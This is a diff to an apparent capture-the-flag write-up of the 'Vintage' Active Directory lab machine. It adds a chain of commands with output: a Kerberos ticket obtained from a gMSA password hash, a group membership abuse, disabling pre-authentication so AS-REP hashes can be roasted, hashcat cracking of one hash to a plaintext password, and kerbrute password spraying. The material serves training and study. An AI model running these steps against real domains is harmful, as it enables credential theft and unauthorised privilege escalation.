@@ -426,7 +426,7 @@ Let's use the `ReadGMSAPassword` permission to get the password hash for `GMSA01
 ```console
 root@kali:~# export KRB5CCNAME='FS01$.ccache'
 
-root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d 'vintage.htb' -k --dc-ip 10.10.11.45 get object 'GMSA01$' --attr msDS-ManagedPassword
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb -k --dc-ip 10.10.11.45 get object 'GMSA01$' --attr msDS-ManagedPassword
 [+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:FS01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
 [*] Trying to connect to dc01.vintage.htb...
 [+] Connection successful
@@ -451,6 +451,180 @@ GenericWrite:
 
 ![image](https://github.com/user-attachments/assets/49149ccc-d3c3-4cd8-8aa9-4f0992729b3f)
 
-Lastly, `ServiceManagers` has `GenericAll` rights to its 3 member: `svc_ark`, `svc_ldap` and `svc_sql`
+Get a TGT for `GMSA01$` using the password hash retrieved:
+
+```console
+root@kali:~# impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in GMSA01$.ccache
+
+root@kali:~# export KRB5CCNAME='GMSA01$.ccache'
+```
+
+Adding `GMSA01$` self to `ServiceManagers`:
+
+```console
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add groupMember ServiceManagers 'GMSA01$'
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+[+] GMSA01$ added to ServiceManagers
+```
+
+Verify membership:
+
+```console
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k get object CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb --attr member
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+
+distinguishedName: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
+member: CN=C.Neri,CN=Users,DC=vintage,DC=htb; CN=G.Viola,CN=Users,DC=vintage,DC=htb; CN=L.Bianchi,CN=Users,DC=vintage,DC=htb; CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
+```
+
+### 3.4. Moving to `svc_` accounts
+
+Lastly, `ServiceManagers` has `GenericAll` rights to its 3 members: `svc_ark`, `svc_ldap` and `svc_sql`
 
 ![image](https://github.com/user-attachments/assets/2b5e517c-027e-4063-aa42-be454c28c9cc)
+
+Let's set `DONT_REQ_PREAUTH` on these accounts to try and get their password hashes:
+
+```consoleroot@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_ark -f DONT_REQ_PREAUTH
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+[-] ['DONT_REQ_PREAUTH'] property flags added to svc_ark's userAccountControl
+
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_ldap -f DONT_REQ_PREAUTH
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+[-] ['DONT_REQ_PREAUTH'] property flags added to svc_ldap's userAccountControl
+
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_sql -f DONT_REQ_PREAUTH
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+[-] ['DONT_REQ_PREAUTH'] property flags added to svc_sql's userAccountControl
+```
+
+Run `GetNPUsers` to get the password hashes:
+
+```console
+root@kali:~# cat << EOF > svc.lst
+svc_ark
+svc_ldap
+svc_sql
+EOF
+
+root@kali:~# impacket-GetNPUsers vintage.htb/ -no-pass -dc-ip 10.10.11.45 -request -usersfile svc.lst
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+$krb5asrep$23$svc_ark@VINTAGE.HTB:c8650cb31c465483ccfe43029939d363$9e1096eb662f27c9182342d1ad430f9ff42e056acaf72cd7a52bd8dcbea1b29d7c461d6c86cb4d3d58cdbd079a61a0bfa226ccad84a80ef565d8d5c3a5d0e822c6938693083f533bc93d1fb6880d12a72a4ababaa9c95371a3e17655116b07dad794b4317894dda00bed3ee5e6274b9c2ff5b6b1b56ff3f067e4a49a67450483485042a7211c721152825e1027e83feace26f66c375ff4327360c609e36957736fe703f153a67883cf6db3fa39ae466a257658f3a619722dd276de8e6e816c799261c5e34d1375aca8e0734ba2832afd0885e1d5cd87a7727edd928cc80aa62c9cb7680a229386353252
+$krb5asrep$23$svc_ldap@VINTAGE.HTB:fa1e8d177ca3b0234cf7561f9e85229f$51634fbe530bf13b3640319504e620c7263e3d442a6bf4f0f038bedea51491545d479edceded2c76aa5952b89ea5523abe138969e35d48ab1750647f9c9d57568c838c040f6b8ad89d289e1c03ed5ad4434406c66a044d6518567f58723aea3ef053a6299531f9e42e3ac324d426bdc77166eeda364a8ab23e067412bda6fab81b68115ddc0af76d59acf8edbd08798e810274d6ee6066896fadc321a34d7d181c6af4b7bacd078f2a508fecb22594dac89e5c78a88de1f1317ae4d58d133d78a2dc62711a8a0c49486c9260dd47d1cc1220cbaa8d297dbca466a055c35a8382686c3701f27c73b07b6c
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+```
+
+`KDC_ERR_CLIENT_REVOKED` encountered for `svc_sql`, it's likely that the account is disabled, let's enable it with `bloodyAD`:
+
+```console
+root@kali:~# bloodyAD -v DEBUG --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
+[+] Connection URL: ldap+kerberos-ccache://vintage.htb\None:GMSA01%24.ccache@dc01.vintage.htb/?serverip=10.10.11.45&dc=10.10.11.45
+[*] Trying to connect to dc01.vintage.htb...
+[+] Connection successful
+[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
+```
+
+Run `GetNPUsers` again to get the password hashes and save it to `hashes.txt`
+
+```console
+root@kali:~# impacket-GetNPUsers vintage.htb/ -no-pass -dc-ip 10.10.11.45 -request -usersfile svc.lst | grep krb5asrep | tee hashes.txt
+$krb5asrep$23$svc_ark@VINTAGE.HTB:90394f4f4515085e673e7460d121a059$5d25e1fc7a4a4e86f7d7876dee3d28e88ba75f401d2810e8b1df67857e746c6f777949e7eaed143ec2ad69ef4e739b95e57f651d3713063380a3c7964a9d0eb5e667cdfdac06b7697d633c4df470e96a646f9a5bf99aeb05e4f8800319fd2936ea9284101ef816090797ab54d233b66e0c274d37ffcad397c286fca498277392ff256881c092e9b2626ead9da49998803097df8a9c9900b6994e289a094ab67dc7eed4583c717cf7c3e890b91e8ad2e23182c0b2ad801b9e9c76e6dd266c5685f208e2439e782d181ff8523918299f9c061174f783af77d87d1c1d6d29350105a59d1c1c3d3a72013c8b
+$krb5asrep$23$svc_ldap@VINTAGE.HTB:576dc870c88a60aae0d2a40e16e0656d$b590962824be0d5eb3910ec2fde6f7ea320a680b902ca3f3fcc68838c61a2204d99c52b0330819cec0ce9adcbc5db3de946789f21f6fcedcf48e9d93345fbdcae17f2fd0667521b98705e5ed3893ebd5a020c29aaf7ff160f0063d18b3ab4a2af1275052743c9cec5c3dae26b36ee8436f0b71e6c5f1850f4eb533e81bd4d06de2531308f625c2a756945e0f63ea5e6d80759bb30d437f78a2b9a36823ed4cf4b313b6e0d90ec8457b18c520084ba46731658074d32b4cab6abd7186c87946c3c900ad9684f51a4e9b3656ee0f50557c64a5c98a619e3378fec4961ec19d25e782bd5e72439fe9d06a65
+$krb5asrep$23$svc_sql@VINTAGE.HTB:7f721c7fd76af48f34c25897190d620c$124639b5b33120728f6429d945a9f221ec0bc18ab3655c2b04d784908ba6780a32cac3ea4315e306a3c00679e6337600b4d7fb4bf09f5014a26c48938f0a049bbc37759a761b3469b5b56d0ab4411d807bbd8d554934fcb92dd812fe0ba93162015de5d95ebc62d6287d9004c512d53ddb942b7909923e3237758f44de9d425af6651ddda73a9a68b325c8b4c05a41a1acb916db658c97b4261c0d3124d75d890ab02a6e71a6721bb58ddf099e150d880ee3423fd096c9e1d7babb5a9c41129e32af5c09bc658d0cfbc487f81f763e0f4dcf33172f7c5a2ebbd7d1d19cf28b58c8a16180482539c207ea
+```
+
+Crack the password hash with `hashcat` → password `` found:
+
+```console
+root@kali:~# hashcat hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
+⋮
+
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
+⋮
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5asrep$23$svc_sql@VINTAGE.HTB:7f721c7fd76af48f34c25897190d620c$124639b5b33120728f6429d945a9f221ec0bc18ab3655c2b04d784908ba6780a32cac3ea4315e306a3c00679e6337600b4d7fb4bf09f5014a26c48938f0a049bbc37759a761b3469b5b56d0ab4411d807bbd8d554934fcb92dd812fe0ba93162015de5d95ebc62d6287d9004c512d53ddb942b7909923e3237758f44de9d425af6651ddda73a9a68b325c8b4c05a41a1acb916db658c97b4261c0d3124d75d890ab02a6e71a6721bb58ddf099e150d880ee3423fd096c9e1d7babb5a9c41129e32af5c09bc658d0cfbc487f81f763e0f4dcf33172f7c5a2ebbd7d1d19cf28b58c8a16180482539c207ea:Zer0the0ne
+Approaching final keyspace - workload adjusted.
+
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: hashes.txt
+Time.Started.....: Wed Jan  1 13:36:54 2025 (7 secs)
+Time.Estimated...: Wed Jan  1 13:37:01 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  3936.1 kH/s (0.77ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new), 1/3 (33.33%) Salts
+Progress.........: 43033155/43033155 (100.00%)
+Rejected.........: 0/43033155 (0.00%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
+
+Started: Wed Jan  1 13:36:53 2025
+Stopped: Wed Jan  1 13:37:03 2025
+```
+
+### 3.5. Moving to `C.Neri`
+
+`svc_sql` appears to be a dead end as it doesn't seem to have any useful access, but the password was just crack - let's try password spray to check for password reuse:
+
+```console
+root@kali:~# pipx install kerbrute
+  installed package kerbrute 0.0.2, installed using Python 3.12.8
+  These apps are now globally available
+    - kerbrute
+⚠️  Note: '/root/.local/bin' is not on your PATH environment variable. These apps will not be globally accessible until your PATH is updated. Run `pipx ensurepath` to automatically add it, or manually
+    modify your PATH in your shell's config file (e.g. ~/.bashrc).
+done! ✨ 🌟 ✨
+
+root@kali:~# .local/bin/kerbrute -users users.lst -password Zer0the0ne -domain vintage.htb -dc-ip dc01.vintage.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Valid user => Administrator
+[*] Blocked/Disabled user => Guest
+[*] Blocked/Disabled user => krbtgt
+[*] Valid user => DC01$
+[*] Valid user => gMSA01$
+[*] Valid user => FS01$
+[*] Valid user => M.Rossi
+[*] Valid user => R.Verdi
+[*] Valid user => L.Bianchi
+[*] Valid user => G.Viola
+[*] Stupendous => C.Neri:Zer0the0ne
+[*] Saved TGT in C.Neri.ccache
+[*] Valid user => P.Rosa
+[*] Stupendous => svc_sql:Zer0the0ne
+[*] Saved TGT in svc_sql.ccache
+[*] Valid user => svc_ldap [NOT PREAUTH]
+[*] Valid user => svc_ark [NOT PREAUTH]
+[*] Valid user => C.Neri_adm
+[*] Valid user => L.Bianchi_adm
+```
